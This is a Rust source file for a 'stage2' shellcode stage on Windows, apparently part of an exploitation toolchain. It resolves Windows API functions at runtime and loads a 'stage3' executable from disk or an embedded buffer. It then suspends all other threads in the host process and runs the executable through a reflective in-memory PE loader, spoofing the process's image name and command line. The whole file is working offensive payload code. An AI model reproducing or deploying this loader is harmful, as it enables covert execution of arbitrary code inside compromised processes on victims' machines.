#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(overflowing_literals)]
#![no_std]
#![no_main]

extern crate alloc;

use core::panic::PanicInfo;

use allocators::WinGlobalAlloc;
use shellcode_utils::prelude::*;
use solstice_loader::DependentModules;
use solstice_loader::LoaderContext;
use solstice_loader::RuntimeFns;

macro_rules! debug_print {
    ($kernelbase_ptr:expr, $msg:expr) => {
        #[cfg(feature = "debug")]
        #[allow(unused_unsafe)]
        unsafe {
            fetch_output_debug_string($kernelbase_ptr)(concat!($msg, "\n\0").as_ptr() as _)
        }
    };
}

#[cfg(not(feature = "embedded_image"))]
mod disk;
#[cfg(feature = "embedded_image")]
mod embedded;

#[cfg(not(feature = "embedded_image"))]
use disk::load_image;
#[cfg(not(feature = "embedded_image"))]
use disk::ImageData;
#[cfg(feature = "embedded_image")]
use embedded::load_image;
#[cfg(feature = "embedded_image")]
use embedded::ImageData;

/// The stage3 image and the strings the loader patches into the process
/// parameters. The process keeps pointers to the strings, so they are leaked.
struct Stage3Image {
    pe_data: ImageData,
    /// Null terminated.
    image_name: &'static [u16],
    /// Null terminated `"<image name>" <args>` command line.
    command_line: &'static [u16],
}

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

entry_point!(stage2_main);

extern "C" fn stage2_main(args: *const ShellcodeArgs) -> u64 {
    let kernelbase_ptr = get_kernelbase().unwrap();
    let kernel32_ptr = get_kernel32_legacy(kernelbase_ptr).or_else(|| get_kernel32(kernelbase_ptr));

    debug_print!(kernelbase_ptr, "Hello from stage2");

    let allocator = WinGlobalAlloc::new(kernelbase_ptr);

    let image = match load_image(args, kernelbase_ptr, &allocator) {
        Ok(image) => image,
        Err(code) => return code,
    };

    // Pause all other threads
    unsafe {
        shellcode_utils::suspend_threads(kernel32_ptr.unwrap(), kernelbase_ptr);
    }

    debug_print!(kernelbase_ptr, "Attempting to load PE");
    let context = LoaderContext {
        buffer: &image.pe_data,
        image_name: Some(image.image_name),
        args: Some(image.command_line),
        modules: DependentModules {
            kernelbase: kernelbase_ptr as *mut _,
        },
        fns: RuntimeFns {
            virtual_alloc: fetch_virtual_alloc(kernelbase_ptr),
            virtual_protect: fetch_virtual_protect(kernelbase_ptr),
            get_proc_address_fn: fetch_get_proc_address(kernelbase_ptr),
            load_library_fn: fetch_load_library(kernelbase_ptr),
            create_thread_fn: fetch_create_thread(kernelbase_ptr),
            get_module_handle_fn: fetch_get_module_handle(kernelbase_ptr),
            rtl_add_function_table_fn: None,
        },
    };
    unsafe {
        solstice_loader::reflective_loader(context);
    }

    0x1337
}
